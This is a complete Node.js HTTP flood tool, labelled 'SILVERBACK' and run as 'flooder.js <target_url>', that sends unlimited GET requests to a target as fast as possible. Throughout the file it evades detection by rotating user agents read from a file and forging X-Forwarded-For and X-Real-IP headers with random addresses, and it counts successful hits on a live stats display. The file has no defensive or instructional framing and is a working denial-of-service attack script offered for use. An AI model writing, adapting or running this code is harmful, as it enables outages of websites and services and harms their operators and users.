const http = require('http');
const fs = require('fs');

// Load user agents from a file for disguising
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(Boolean);

// Track statistics
let totalRequests = 0;
let successfulRequests = 0;
let failedRequests = 0;

// Set logging interval to update stats without terminal spamming
const logInterval = 1000; // Log every second

// Simple method to log stats periodically
function logStats() {
  setInterval(() => {
    console.clear(); // Clear the terminal screen
    console.log('SILVERBACK');
    console.log('==========');
    console.log(`TOTAL - ${totalRequests}`);
    console.log(`HIT - ${successfulRequests}`);
    console.log(`KXX - ${failedRequests}`);
    console.log('=============================');
  }, logInterval);
}

// Generate random User-Agent from the loaded file
function getRandomUserAgent() {
  return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Generate random IP to spoof the request (for X-Forwarded-For and X-Real-IP)
function generateRandomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
}

// Basic headers to simulate a real browser request
function getSpoofedHeaders() {
  return {
    'User-Agent': getRandomUserAgent(),
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    'X-Forwarded-For': generateRandomIP(), // Random spoofed IP
    'X-Real-IP': generateRandomIP(), // Another random spoofed IP
    'Upgrade-Insecure-Requests': '1',
    'DNT': '1',
    'Range': 'bytes=0-1000',
    'TE': 'Trailers',
  };
}

// Flooder function to continuously send requests
function sendRequest(target) {
  const options = {
    hostname: target,
    port: 80, // Use HTTP 1.1 over port 80
    path: '/',
    method: 'GET',
    headers: getSpoofedHeaders(),
  };

  const req = http.request(options, (res) => {
    if (res.statusCode >= 200 && res.statusCode < 400) {
      successfulRequests++;
    } else {
      failedRequests++;
    }

    totalRequests++;
  });

  req.on('error', (error) => {
    failedRequests++;
    totalRequests++;
    console.error(`[Error] ${error.message}`);
  });

  req.end();
}

// Main process to initiate the flooding with multiple requests
function startFlood(target) {
  if (!target) {
    console.error('Usage: node flooder.js <target_url>');
    process.exit(1);
  }

  // Start logging stats in a separate interval
  logStats();

  // Continuously send requests without limit
  setInterval(() => {
    sendRequest(target); // Send a request
  }, 0); // Send requests as fast as possible (no interval)
}

// Execute the flood with target URL passed as a command argument
const target = process.argv[2];
startFlood(target); // No limit on requests, it keeps going until manually stopped
